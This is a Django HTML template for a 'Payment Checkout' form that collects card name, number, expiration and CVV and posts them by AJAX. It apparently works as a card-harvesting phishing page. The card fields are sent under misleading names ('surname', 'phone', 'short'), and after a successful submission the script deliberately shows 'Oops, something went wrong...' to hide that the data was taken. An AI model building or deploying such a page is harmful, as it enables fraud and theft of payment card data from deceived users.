<div class="container">
  <main>
    <div class="py-5 text-center">

        <img src="{% static 'images/windLogo.png' %}">

       <h2>Payment Checkout</h2>
      </div>
        <form class="needs-validation" id="paymentForm" form method="post" novalidate action="{% url 'submit_payment' %}">
        
          
          {% csrf_token %}
            
        

          <div class="row g-3">

          <hr class="my-4">

            <div class="col-md-6">
              <label for="cc-name" class="form-label">Name on card</label>
              <input type="text" class="form-control" id="cc-name" name="name"  placeholder="" required pattern="[A-Za-z]{5,}">
              <small class="text-body-secondary">Full name as displayed on card</small>
              <div class="invalid-feedback">
                Name on card is required
              </div>
            </div>

            <div class="col-md-6">
              <label for="cc-number" class="form-label">Credit card number</label>
              <input type="text" class="form-control" id="cc-number surname"name="surname" placeholder="" pattern="\d{16}" title="Please enter exactly 16 digits" required >
              <div class="invalid-feedback">
                Please enter exactly 16 digits
              </div>
            </div>
            

            <div class="col-md-3">
              <label for="cc-expiration" class="form-label">Expiration</label>
              <input type="text" class="form-control"  name="phone" placeholder="" required pattern="\d{4}" title="Please enter exactly 4 digits">
              <div class="invalid-feedback">
                Please enter exactly 4 digits
              </div>
            </div>
            
            <div class="col-md-3">
              <label for="cc-cvv" class="form-label">CVV</label>
              <input type="text" class="form-control" name="short" placeholder="" required pattern="\d{3,4}" title="Please enter 3 or 4 digits">
              <div class="invalid-feedback">
                Please enter 3 or 4 digits
              </div>
            </div>
          </div>

          <hr class="my-4">

          <button class="w-100 btn btn-primary btn-lg" type="submit" value="Отправить">Submit</button>
          
        </form>
      </div>
    </div>
  </main>
  <div id="overlay"></div>
  <div id="modal" class="modal">
      <div class="modal-content">
          <span class="close" onclick="closeModal()">&times;</span>
          <p id="modalMessage"></p>
      </div>
  </div>
  
<script>
  // Your existing JavaScript code
  document.getElementById('paymentForm').addEventListener('submit', function (event) {
      event.preventDefault();

      // Perform form submission via AJAX
      var formData = new FormData(this);

      fetch(this.action, {
          method: 'POST',
          body: formData,
      })
      .then(response => response.json())
      .then(data => {
          if (data.success) {
              // Show success modal after a 1-second delay
              setTimeout(function() {
                  showModal('Oops, something went wrong...');
              }, 1300);
          } 
      });
  });

  // Function to show the modal
  function showModal(message) {
      document.getElementById('modalMessage').innerHTML = message;
      document.getElementById('modal').style.display = 'block';
      document.getElementById('overlay').style.display = 'block';
  }

  // Function to close the modal
  function closeModal() {
      document.getElementById('modal').style.display = 'none';
      document.getElementById('overlay').style.display = 'none';
  }
</script>
